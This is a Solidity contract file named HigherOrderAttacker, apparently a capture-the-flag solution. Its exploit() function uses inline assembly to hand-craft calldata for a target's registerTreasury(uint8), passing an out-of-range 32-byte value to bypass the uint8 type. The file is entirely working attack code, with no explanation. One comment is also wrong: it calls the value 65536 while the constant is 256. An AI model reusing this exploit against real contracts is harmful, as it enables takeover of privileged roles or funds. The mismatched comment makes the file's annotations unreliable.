pragma solidity ^0.6.12;

contract HigherOrderAttacker {
    address public _target;

    constructor(address _targetAddress) public {
        _target = _targetAddress;
    }

    function exploit() external {
        bytes4 funcSig = 0x2548ce37; // keccak256 of registerTreasury(uint8)
        assembly {
            // Load target from storage slot 0 (since _target is the first state variable)
            let targetAddress := sload(0)
            // Allocate memory for the payload
            let payload := mload(0x40)
            mstore(0x40, add(payload, 0x24)) // Advance free memory pointer
            mstore(payload, funcSig)             // Set function selector
            // Set the value to 65536 (0x0000...0100) as 32-byte uint256
            mstore(add(payload, 4), 0x0000000000000000000000000000000000000000000000000000000000000100)
            // Call target contract
            let success := call(gas(), targetAddress, 0, payload, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
